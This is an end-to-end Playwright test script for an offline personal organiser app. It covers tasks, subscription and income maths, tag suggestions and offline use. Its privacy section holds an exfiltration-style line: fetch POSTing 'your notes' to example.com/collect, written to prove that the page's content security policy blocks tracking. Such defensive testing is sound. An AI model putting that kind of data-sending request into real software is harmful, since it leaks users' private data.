/**
 * End-to-end check of the things that are hard to unit test: does the app
 * actually work in a browser, does it survive with no network, and - the claim
 * this whole project rests on - can the page reach the network at all?
 *
 * Run it against a production build:
 *
 *     npm run build
 *     npm i --no-save playwright
 *     node e2e/app-check.mjs
 *
 * It starts and stops its own preview server.
 */
import { spawn } from 'node:child_process';
import { mkdirSync, readFileSync } from 'node:fs';
import { chromium } from 'playwright';

const PORT = 4173;
// Set VITE_BASE to check a subpath deployment (GitHub Pages serves a project
// repo at /<repo>/, which is exactly where absolute paths go wrong).
const PATH_BASE = process.env.VITE_BASE?.trim() ? `/${process.env.VITE_BASE.replace(/^\/+|\/+$/g, '')}/` : '/';
const BASE = `http://127.0.0.1:${PORT}${PATH_BASE}`;
const OUT = process.env.SCREENSHOT_DIR ?? 'e2e/screenshots';
const CHROME = process.env.CHROME_PATH; // unset uses Playwright's own download

mkdirSync(OUT, { recursive: true });

// The preview server serves at VITE_BASE, but dist/ was built with whatever
// base was set when `npm run build` ran. If they disagree every asset 404s and
// the app never mounts - which looks like a mysterious hang, not a mismatch.
// Fail immediately, with the command that fixes it.
{
  const indexHtml = readFileSync('dist/index.html', 'utf8');
  const scriptSrc = /<script[^>]+src="([^"]+)"/.exec(indexHtml)?.[1] ?? '';
  // Compare the base itself, not a prefix: every absolute path starts with
  // "/", so a startsWith check silently passes for a root-built dist.
  const distBase = scriptSrc.slice(0, scriptSrc.indexOf('assets/'));
  if (distBase !== PATH_BASE) {
    // Throw rather than process.exit: exit can truncate a buffered write, and
    // a guard whose message never appears is worse than no guard.
    throw new Error(
      `dist/ was built for a different base.\n` +
        `  serving at : ${PATH_BASE}\n` +
        `  dist built : ${distBase || '(could not parse dist/index.html)'}\n` +
        `Rebuild first: ${PATH_BASE === '/' ? 'npm run build' : `VITE_BASE=${PATH_BASE} npm run build`}`,
    );
  }
}

const server = spawn('npx', ['vite', 'preview', '--port', String(PORT), '--host', '127.0.0.1'], {
  stdio: 'ignore',
  detached: true,
  env: process.env,
});
const stopServer = () => {
  try {
    process.kill(-server.pid, 'SIGKILL');
  } catch {
    /* already gone */
  }
};
process.on('exit', stopServer);
await new Promise((r) => setTimeout(r, 4000));

const problems = [];
const check = (label, actual, expected) => {
  const ok = actual === expected;
  console.log(`${ok ? 'ok  ' : 'FAIL'}  ${label}${ok ? '' : ` (got ${JSON.stringify(actual)})`}`);
  if (!ok) problems.push(label);
};

const browser = await chromium.launch(CHROME ? { executablePath: CHROME } : {});
const ctx = await browser.newContext({ viewport: { width: 412, height: 915 }, deviceScaleFactor: 2 });
const page = await ctx.newPage();

const consoleErrors = [];
page.on('console', (m) => {
  if (m.type() === 'error') consoleErrors.push(m.text());
});
page.on('pageerror', (e) => consoleErrors.push(`pageerror: ${e.message}`));

const todayKey = (() => {
  const d = new Date();
  return `${d.getFullYear()}-${String(d.getMonth() + 1).padStart(2, '0')}-${String(d.getDate()).padStart(2, '0')}`;
})();

console.log(`Checking ${BASE}\n`);
await page.goto(BASE, { waitUntil: 'networkidle' });
await page.evaluate(() => navigator.serviceWorker.ready);
await page.waitForTimeout(1500);

// --- the app is wired for wherever it is served from ----------------------
// Read the href rather than fetching it: the page's own CSP forbids fetch(),
// which is the point of the policy, so the test must not rely on one either.
const manifestHref = await page.evaluate(() => document.querySelector('link[rel=manifest]').href);
check('the manifest link matches the served path', new URL(manifestHref).pathname, `${PATH_BASE}manifest.webmanifest`);
check(
  'the service worker is scoped to the served path',
  await page.evaluate(async () => new URL((await navigator.serviceWorker.ready).scope).pathname),
  PATH_BASE,
);

// --- the update notice ----------------------------------------------------
// A first-ever launch has not updated from anything, so it must stay silent.
check(
  'says nothing about updates on a first launch',
  await page.locator('text=Steady updated').count(),
  0,
);

// Simulate having last seen an older build, without needing a second deploy.
await page.evaluate(
  () =>
    new Promise((resolve) => {
      const req = indexedDB.open('steady');
      req.onsuccess = () => {
        const tx = req.result.transaction('settings', 'readwrite');
        const store = tx.objectStore('settings');
        const get = store.get('settings');
        get.onsuccess = () => {
          store.put({ ...(get.result ?? { id: 'settings' }), lastSeenBuild: 'an-older-build' });
        };
        tx.oncomplete = () => {
          req.result.close();
          resolve();
        };
      };
    }),
);

await page.reload({ waitUntil: 'networkidle' });
await page.waitForTimeout(600);
check('tells you once when the build has changed', await page.locator('text=Steady updated').count(), 1);
check(
  'reassures you the data is untouched',
  (await page.textContent('.main')).includes('untouched'),
  true,
);
await page.screenshot({ path: `${OUT}/update-notice.png`, fullPage: true });

// The build is recorded as soon as it is shown, so it must not come back.
await page.reload({ waitUntil: 'networkidle' });
await page.waitForTimeout(600);
check('does not repeat on the next launch', await page.locator('text=Steady updated').count(), 0);

// --- capture -------------------------------------------------------------
await page.fill('#capture-input', 'Ring the dentist about the referral');
await page.click('button:has-text("Save to inbox")');
await page.waitForTimeout(400);
check('capture lands in the inbox', await page.textContent('.nav-count'), '1');

// --- inbox item becomes a task with steps, a time and a reminder ---------
await page.click('.nav-btn:has-text("Inbox")');
await page.click('button:has-text("Make it a task")');
await page.waitForSelector('#task-title');
await page.fill('#task-step', 'Find the referral letter');
await page.click('button:has-text("Add step")');
await page.fill('#task-step', 'Ring at 9am when they open');
await page.click('button:has-text("Add step")');
await page.fill('#task-date', todayKey);
await page.fill('#task-time', '09:30');
await page.click('button:has-text("30 min")');
await page.click('button:has-text("10 min before")');
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(500);
check('inbox is emptied once the item becomes a task', await page.locator('.nav-count').count(), 0);

// --- a subscription, in one journey -------------------------------------
await page.click('.nav-btn:has-text("Money")');
await page.click('button:has-text("Add a subscription")');
await page.waitForSelector('#sub-name');
// A recognised name should fill the category in by itself.
// Service suggestions must be visible buttons with readable names. The
// native datalist this replaced rendered blank rows on Android - you picked
// something invisible and hoped.
await page.fill('#sub-name', 'netf');
await page.waitForTimeout(250);
const suggestion = page.locator('.field button.btn-sm', { hasText: 'Netflix' }).first();
check('a typed prefix offers a named, visible suggestion', await suggestion.count(), 1);
check('the suggestion button is not blank', (await suggestion.textContent()).trim(), 'Netflix');
await suggestion.click();
await page.waitForTimeout(200);
check('taking the suggestion fills the name', await page.inputValue('#sub-name'), 'Netflix');
check(
  'and picks its category too',
  await page.getAttribute('button[aria-pressed="true"]:has-text("TV & film")', 'aria-pressed'),
  'true',
);
await page.fill('#sub-amount', '12.99');
await page.click('button:has-text("More options")');
await page.fill('#sub-cancel', 'Account > Membership > Cancel Membership');
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(500);

// Straight to the confirmation, which must show the yearly figure - the number
// that actually changes your mind about a subscription.
const confirmation = await page.textContent('.main');
check('saving lands on the confirmation', confirmation.includes('Netflix is saved'), true);
check('the confirmation shows the yearly cost', confirmation.includes('155.88'), true);
check('the confirmation offers the calendar', await page.locator('button:has-text("Add to my calendar")').count(), 1);

// Take the calendar file and check it is a real, single-subscription calendar.
const download = await Promise.all([
  page.waitForEvent('download'),
  page.click('button:has-text("Add to my calendar")'),
]).then(([d]) => d);
check('the calendar file is named after the subscription', download.suggestedFilename(), 'netflix.ics');
const icsText = await download.createReadStream().then(async (stream) => {
  let out = '';
  for await (const chunk of stream) out += chunk;
  return out;
});
check('the calendar is well formed', icsText.startsWith('BEGIN:VCALENDAR'), true);
check('it holds exactly one event', (icsText.match(/BEGIN:VEVENT/g) ?? []).length, 1);
check('it repeats monthly', icsText.includes('RRULE:FREQ=MONTHLY;INTERVAL=1'), true);
check('it carries the 3-day warning', icsText.includes('TRIGGER:-PT4320M'), true);
check('it carries the cancellation steps', icsText.replace(/\r\n /g, '').includes('To cancel: Account'), true);
await page.screenshot({ path: `${OUT}/subscription-saved.png`, fullPage: true });

await page.click('button:has-text("Done")');
await page.waitForTimeout(400);
await page.screenshot({ path: `${OUT}/money.png`, fullPage: true });

// --- an every-2-weeks subscription ----------------------------------------
// The yearly figure is the one that would be quietly wrong if any of the
// fortnightly maths were wrong, and the one you would never spot by eye:
// £15 every 2 weeks is £390 a year, not £180 as twice-monthly would imply.
await page.click('.nav-btn:has-text("Money")');
await page.click('button:has-text("Add a subscription")');
await page.waitForSelector('#sub-name');
await page.fill('#sub-name', 'Veg box');
await page.fill('#sub-amount', '15.00');
await page.click('button:has-text("Every 2 weeks")');
await page.waitForTimeout(150);
check(
  'every 2 weeks is selectable without opening More options',
  await page.getAttribute('button[aria-pressed="true"]:has-text("Every 2 weeks")', 'aria-pressed'),
  'true',
);
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(500);

const fortnightly = await page.textContent('.main');
check('the confirmation counts 26 charges a year', fortnightly.includes('390.00'), true);
check('the card says how often in plain words', fortnightly.includes('every 2 weeks'), true);
await page.screenshot({ path: `${OUT}/fortnightly.png`, fullPage: true });
await page.click('button:has-text("Done")');
await page.waitForTimeout(300);

// A rhythm no button covers must survive a round-trip through the form. If
// picking presets clobbered `every`, an every-2-months bill would silently
// become monthly - doubling its yearly cost and changing its charge dates.
await page.click('button:has-text("Add a subscription")');
await page.waitForSelector('#sub-name');
await page.fill('#sub-name', 'Odd one');
await page.fill('#sub-amount', '20.00');
await page.click('button:has-text("Monthly")');
await page.click('button:has-text("More options")');
await page.fill('#sub-every', '2');
await page.waitForTimeout(150);
check(
  'an uncovered rhythm highlights no preset',
  await page.locator('.btn-row button[aria-pressed="true"]:has-text("Monthly")').count(),
  0,
);
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(400);
check(
  'and is costed as every 2 months, not monthly',
  (await page.textContent('.main')).includes('120.00'),
  true,
);
await page.click('button:has-text("Change something")');
await page.waitForSelector('#sub-name');
// No need to open More options: a subscription with a custom interval opens it
// already, so the unusual setting is visible rather than hidden behind a toggle.
check('reopening shows the custom interval without digging', await page.inputValue('#sub-every'), '2');
await page.click('form.card button:has-text("Cancel")');
await page.waitForTimeout(300);

// --- income, and the numbers nobody checks by hand ------------------------
// $2,500 gross / $1,850 net, twice a month. That is 24 paycheques a year, not
// 26 - take-home is $3,700 a month. Getting the frequency wrong here would
// overstate income by two whole paycheques.
await page.click('.nav-btn:has-text("Money")');
await page.click('button:has-text("Add income")');
await page.waitForSelector('#income-name');
await page.fill('#income-name', 'Main job');
await page.click('button:has-text("Twice a month")');
await page.click('button:has-text("15th and last day")');
await page.fill('#income-gross', '2500.00');
await page.fill('#income-net', '1850.00');
await page.click('button:has-text("+ Federal income tax")');
await page.click('button:has-text("+ Social Security")');
const dedAmounts = page.locator('input[aria-label^="Amount for"]');
await dedAmounts.nth(0).fill('420.00');
await dedAmounts.nth(1).fill('155.00');
await page.waitForTimeout(150);
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(500);

const moneyText = await page.textContent('.main');
check('take-home is 24 paycheques a year, not 26', moneyText.includes('3,700.00'), true);
check('gross is annualised the same way', moneyText.includes('60,000.00'), true);
check('the deduction breakdown appears', moneyText.includes('Federal income tax'), true);
check('the unexplained gap is named, not hidden', moneyText.includes('Not itemised'), true);
await page.screenshot({ path: `${OUT}/income.png`, fullPage: true });

// --- a note --------------------------------------------------------------
await page.click('.nav-btn:has-text("Notes")');
await page.click('button:has-text("New note")');
await page.waitForSelector('#note-title');
await page.fill('#note-title', 'GP surgery details');
await page.fill('#note-body', 'Reception: 0161 496 0000\nAsk for Dr Hall.');
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(400);

// --- tag suggestions, learned on-device -----------------------------------
// Teach it a theme by writing several tagged notes, then check a brand-new
// note about the same theme gets a suggestion, and that tapping it sticks.
const makeNote = async (title, body, tags) => {
  await page.click('.nav-btn:has-text("Notes")');
  await page.click('button:has-text("New note")');
  await page.waitForSelector('#note-title');
  await page.fill('#note-title', title);
  await page.fill('#note-body', body);
  if (tags) await page.fill('#note-tags', tags);
  await page.click('form.card button[type="submit"]:has-text("Save")');
  await page.waitForTimeout(250);
};

// Below the cold-start floor it must say nothing at all.
await makeNote('Dentist appointment', 'Dentist appointment booked for Tuesday', 'health');
await makeNote('Prescription', 'Prescription ready at the pharmacy', 'health');
await page.click('.nav-btn:has-text("Notes")');
await page.click('button:has-text("New note")');
await page.waitForSelector('#note-title');
await page.fill('#note-body', 'Dentist appointment next week');
await page.waitForTimeout(300);
check(
  'stays silent before it has learned enough',
  await page.locator('button:has-text("+ health")').count(),
  0,
);
await page.click('form.card button:has-text("Cancel")');

// Now push the corpus over the floor.
await makeNote('Hygienist', 'Dentist said to book a hygienist appointment', 'health');
await makeNote('Plumber invoice', 'Invoice from the plumber needs paying', 'money');
await makeNote('Refund', 'Refund for the invoice came through', 'money');
await makeNote('Overcharge', 'Paid the invoice and got a refund on the overcharge', 'money');

await page.click('.nav-btn:has-text("Notes")');
await page.click('button:has-text("New note")');
await page.waitForSelector('#note-title');
await page.fill('#note-title', 'Ring the dentist');
await page.fill('#note-body', 'Need to ring the dentist about that appointment');
await page.waitForTimeout(400);
check('suggests a tag it learned from me', await page.locator('button:has-text("+ health")').count(), 1);
check('does not suggest the unrelated tag', await page.locator('button:has-text("+ money")').count(), 0);
check(
  'explains itself',
  (await page.textContent('.main')).includes('Because you have used'),
  true,
);

// Tapping the chip must actually put the tag on the saved note.
await page.click('button:has-text("+ health")');
await page.waitForTimeout(200);
check('tapping fills the tag box', await page.inputValue('#note-tags'), 'health');
await page.click('form.card button[type="submit"]:has-text("Save")');
await page.waitForTimeout(400);
check(
  'the tag is saved on the note',
  await page.evaluate(
    () =>
      new Promise((resolve) => {
        const req = indexedDB.open('steady');
        req.onsuccess = () => {
          const tx = req.result.transaction('notes', 'readonly');
          const all = tx.objectStore('notes').getAll();
          all.onsuccess = () => {
            const note = all.result.find((n) => n.title === 'Ring the dentist');
            req.result.close();
            resolve(note ? note.tags.join(',') : 'NOT FOUND');
          };
        };
      }),
  ),
  'health',
);
await page.screenshot({ path: `${OUT}/tag-suggestions.png`, fullPage: true });

// The tidy-up screen should offer the same suggestion for an untagged note.
await makeNote('Old note', 'Dentist rang about the appointment', '');
await page.click('.nav-btn:has-text("Notes")');
await page.click('button:has-text("Tidy up untagged notes")');
await page.waitForTimeout(400);
check('tidy-up offers suggestions', await page.locator('button:has-text("+ health")').count() >= 1, true);
await page.screenshot({ path: `${OUT}/tidy-up.png`, fullPage: true });
await page.click('button:has-text("Done")');
await page.waitForTimeout(200);

// --- today pulls it all together ----------------------------------------
await page.click('.nav-btn:has-text("Today")');
await page.waitForTimeout(400);
const todayText = await page.textContent('.main');
check('the task shows on Today', todayText.includes('Ring the dentist'), true);
check('the renewal shows on Today', todayText.includes('Netflix renews'), true);
await page.screenshot({ path: `${OUT}/today.png`, fullPage: true });

// --- appearance settings really apply ------------------------------------
await page.click('.header button:has-text("Settings")');
await page.waitForTimeout(300);
await page.click('button:has-text("Dark")');
await page.waitForTimeout(300);
check('the dark theme applies', await page.getAttribute('html', 'data-theme'), 'dark');
await page.screenshot({ path: `${OUT}/settings-dark.png`, fullPage: true });
await page.click('button:has-text("Calm")');
await page.waitForTimeout(200);

// --- the privacy claim ---------------------------------------------------
// The whole promise is that this page cannot send your data anywhere. Prove it
// by trying, from inside the page, exactly what a tracker would do.
const exfiltration = await page.evaluate(async () => {
  try {
    await fetch('https://example.com/collect', { method: 'POST', body: 'your notes' });
    return 'LEAKED';
  } catch {
    return 'BLOCKED';
  }
});
check('the browser refuses to let the page phone home', exfiltration, 'BLOCKED');

// --- offline -------------------------------------------------------------
// Stop the server outright rather than emulating offline, so this also proves
// the service worker precached everything on the very first visit.
console.log('\n--- stopping the server to test with no network ---');
stopServer();
await new Promise((r) => setTimeout(r, 1500));

await page.reload({ waitUntil: 'domcontentloaded' });
await page.waitForTimeout(2500);
check('the app still renders with no server', await page.evaluate(() => Boolean(document.querySelector('.main'))), true);
check('the whole nav is there', await page.evaluate(() => document.querySelectorAll('.nav-btn').length), 5);
check('the data is still there', (await page.textContent('.main')).includes('Ring the dentist'), true);
await page.screenshot({ path: `${OUT}/offline.png`, fullPage: true });

// The only console errors we tolerate are our own deliberate exfiltration test.
const unexpected = consoleErrors.filter((e) => !e.includes('example.com'));
check('no unexpected console errors', unexpected.length, 0);
if (unexpected.length) console.log(unexpected.join('\n'));

await browser.close();
stopServer();

console.log(`\nScreenshots in ${OUT}/`);
if (problems.length) {
  console.error(`\n${problems.length} check(s) failed.`);
  process.exit(1);
}
console.log('\nAll checks passed.');
